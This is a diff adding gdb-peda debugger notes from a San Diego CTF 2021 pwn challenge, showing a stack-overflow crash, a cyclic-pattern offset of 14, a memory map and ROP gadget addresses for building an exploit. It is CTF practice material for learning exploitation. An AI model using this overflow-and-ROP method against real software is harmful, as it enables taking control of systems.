@@ -1,0 +1,64 @@
+[----------------------------------registers-----------------------------------]
+RAX: 0x0 
+RBX: 0x400400 (<_init>:	sub    rsp,0x8)
+RCX: 0x3c0 
+RDX: 0x0 
+RSI: 0x6bbd30 --> 0x0 
+RDI: 0x6b9360 --> 0xfbad2a84 
+RBP: 0x4124414142414173 ('sAABAA$A')
+RSP: 0x7fffffffdd98 ("AnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$"...)
+RIP: 0x400bee (<main+129>:	ret)
+R8 : 0x6bbd30 --> 0x0 
+R9 : 0x6bd880 (0x00000000006bd880)
+R10: 0x0 
+R11: 0x246 
+R12: 0x401970 (<__libc_csu_fini>:	push   rbp)
+R13: 0x0 
+R14: 0x6b9018 --> 0x444680 (<__strcpy_sse2_unaligned>:	mov    rcx,rsi)
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x400be3 <main+118>:	call   0x410760 <fflush>
+   0x400be8 <main+123>:	mov    eax,0x0
+   0x400bed <main+128>:	leave  
+=> 0x400bee <main+129>:	ret    
+   0x400bef:	nop
+   0x400bf0 <get_common_indeces.constprop.1>:	push   rbx
+   0x400bf1 <get_common_indeces.constprop.1+1>:	sub    rsp,0x88
+   0x400bf8 <get_common_indeces.constprop.1+8>:	test   rdi,rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffdd98 ("AnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$"...)
+0008| 0x7fffffffdda0 ("AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%"...)
+0016| 0x7fffffffdda8 (";AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA"...)
+0024| 0x7fffffffddb0 ("AaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%E"...)
+0032| 0x7fffffffddb8 ("AAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%"...)
+0040| 0x7fffffffddc0 ("GAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A"...)
+0048| 0x7fffffffddc8 ("AHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G\n")
+0056| 0x7fffffffddd0 ("AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G\n")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x0000000000400bee in main ()
+gdb-peda$ patto AnAA
+AnAA found at offset: 14
+
+gdb-peda$ vmmap
+Start              End                Perm	Name
+0x00400000         0x004b6000         r-xp	/home/mito/CTF/San_Diego_CTF_2021/Pwn_Unique_Lasso/uniqueLasso
+0x006b6000         0x006bc000         rw-p	/home/mito/CTF/San_Diego_CTF_2021/Pwn_Unique_Lasso/uniqueLasso
+0x006bc000         0x006e0000         rw-p	[heap]
+0x00007ffff7ffa000 0x00007ffff7ffd000 r--p	[vvar]
+0x00007ffff7ffd000 0x00007ffff7fff000 r-xp	[vdso]
+0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
+0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
+gdb-peda$ 
+
+0x0000000000474ae5: syscall; ret;
+0x00000000004006a6: pop rdi; ret;
+0x00000000004005af: pop rax; ret;
+0x0000000000410b63: pop rsi; ret;
+0x000000000044c616: pop rdx; ret;
+0x000000000044c639: pop rdx; pop rsi; ret; 
+
+
+
